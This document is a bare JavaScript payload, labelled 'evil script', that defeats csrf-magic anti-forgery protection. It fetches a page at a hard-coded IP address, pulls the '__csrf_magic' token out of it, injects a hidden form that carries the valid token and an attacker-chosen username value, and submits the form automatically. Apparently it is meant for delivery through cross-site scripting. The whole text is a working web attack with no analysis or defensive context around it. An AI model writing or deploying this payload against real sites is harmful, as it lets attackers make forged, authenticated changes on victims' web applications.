<script>
console.log("Running evil script");
var csrfProtectedPage = 'https://72.1.207.178/index.php';
var csrfProtectedForm = 'form';

// get valid token for current request
var html = get(csrfProtectedPage);
document.body.innerHTML = html;
var form = document.getElementById(csrfProtectedForm);
var token = document.getElementsByName("__csrf_magic")[0].value;

// build form with valid token and evil credentials
document.body.innerHTML
        += '<form action="' + csrfProtectedPage + '" method="POST">'
        + '<input type="hidden" name="token" value="' + token + '">'
        + '<input id="username" name="name" value="xl7dev">'
        + '</form>';

// submit form
document.forms[0].submit();

function get(url) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
</script>
